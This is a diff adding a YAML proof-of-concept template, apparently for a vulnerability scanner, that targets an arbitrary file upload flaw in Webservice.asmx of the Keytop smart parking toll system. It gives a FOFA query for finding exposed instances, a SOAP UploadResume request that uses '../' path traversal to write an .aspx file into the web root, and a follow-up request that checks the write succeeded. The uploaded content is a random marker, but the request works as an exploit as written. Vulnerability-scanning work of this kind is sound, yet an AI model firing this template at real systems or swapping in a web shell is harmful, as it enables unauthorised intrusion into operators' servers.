@@ -1,0 +1,46 @@
+id: poc-yaml-keytop-toll-system-webservice-asmx-anyfile-upload
+info:
+  name: 科拓全智能停车收费系统 Webservice.asmx 任意文件上传
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 科拓全智能停车收费系统
+  fofa: body="/KT_Css/qd_defaul.css"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+  t3: base64(t2)
+requests:
+- method: POST
+  path: /Webservice.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/UploadResume
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <UploadResume xmlns="http://tempuri.org/">
+
+    <ip>1</ip>
+
+    <fileName>../../../../{{.t1}}.aspx</fileName>
+
+    <fileFlow>{{.t3}}</fileFlow>
+
+    <tag>3</tag>
+
+    </UploadResume>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: status_code == 200 && contains(body,"<UploadResumeResult>")
+- method: GET
+  path: /{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
